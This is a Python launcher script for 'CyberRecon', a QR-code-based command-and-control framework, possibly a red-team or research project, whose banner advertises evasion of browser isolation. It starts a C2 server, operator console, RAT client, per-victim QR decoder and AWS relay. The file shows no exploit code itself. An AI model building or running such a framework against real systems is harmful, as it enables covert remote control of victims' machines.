"""
CyberRecon Unified Launcher
Start C2 Server, QR Decoder, or Operator CLI from one entry point.
"""

import argparse
import subprocess
import sys


def _run(argv: list) -> None:
    """Run a subprocess safely without a shell (CWE-78 mitigation)."""
    try:
        subprocess.run([sys.executable, *argv], shell=False, check=False)
    except FileNotFoundError as e:
        print(f"[!] Command not found: {e}")


def start_c2():
    """Start the C2 Server."""
    print("[*] Starting CyberRecon C2 Server...")
    _run(["c2_server.py"])


def start_decoder(victim_id, c2_url):
    """Start the QR Decoder client (unified into rat_client.py)."""
    print(f"[*] Starting QR Decoder for victim: {victim_id}")
    _run(["rat_client.py", "--c2", c2_url, "--victim-id", victim_id, "--interval", "5"])


def start_operator(c2_url):
    """Start the Operator CLI."""
    print("[*] Starting Operator CLI...")
    _run(["operator_cli.py", "--c2", c2_url])


def start_rat(c2_host, c2_port):
    """Start the RAT client."""
    print("[*] Starting CyberRecon RAT Client...")
    _run(["rat_client.py", "--c2", c2_host, "--c2-port", str(c2_port)])


def start_aws_relay(c2_backend):
    """Start AWS Relay Server."""
    print("[*] Starting AWS Relay Server...")
    _run(["aws_relay.py", "--c2", c2_backend])


def run_tests():
    """Run integration tests."""
    print("[*] Running integration tests...")
    _run(["tests/test_demo.py"])

def print_banner():
    print(r"""
   ____      _                  ____                      
  / ___|   _| |__   ___ _ __   |  _ \ ___  ___ ___  _ __  
 | |  | | | | '_ \ / _ \ '__|  | |_) / _ \/ __/ _ \| '_ \ 
 | |__| |_| | |_) |  __/ |     |  _ <  __/ (_| (_) | | | |
  \____\__, |_.__/ \___|_|     |_| \_\___|\___\___/|_| |_|
        |___/                                              

  CyberRecon: QR Code-Based C2 Framework
  Mandiant QR C2 Bypass - Browser Isolation Evasion
  Version: 1.0 | Final Review Build
    """)


def main():
    parser = argparse.ArgumentParser(
        description="CyberRecon Unified Launcher",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py --mode c2                    # Start C2 Server
  python main.py --mode operator              # Start Operator CLI
  python main.py --mode decoder --victim-id abc123  # Start QR Decoder
  python main.py --mode rat                   # Start RAT Client
  python main.py --mode relay                 # Start AWS Relay
  python main.py --mode build                 # Build SFX Payload
  python main.py --mode test                  # Run tests
        """
    )

    parser.add_argument("--mode", required=True,
                        choices=["c2", "operator", "decoder", "rat", "relay", "test"],
                        help="Component to launch")
    parser.add_argument("--c2-url", default="http://127.0.0.1:8443",
                        help="C2 server URL")
    parser.add_argument("--c2-host", default="127.0.0.1",
                        help="C2 server host")
    parser.add_argument("--c2-port", type=int, default=8443,
                        help="C2 server port")
    parser.add_argument("--victim-id",
                        help="Victim ID for decoder mode")


    args = parser.parse_args()

    print_banner()

    if args.mode == "c2":
        start_c2()
    elif args.mode == "operator":
        start_operator(args.c2_url)
    elif args.mode == "decoder":
        if not args.victim_id:
            print("[!] --victim-id required for decoder mode")
            sys.exit(1)
        start_decoder(args.victim_id, args.c2_url)
    elif args.mode == "rat":
        start_rat(args.c2_host, args.c2_port)
    elif args.mode == "relay":
        start_aws_relay(args.c2_url)

    elif args.mode == "test":
        run_tests()


if __name__ == "__main__":
    main()
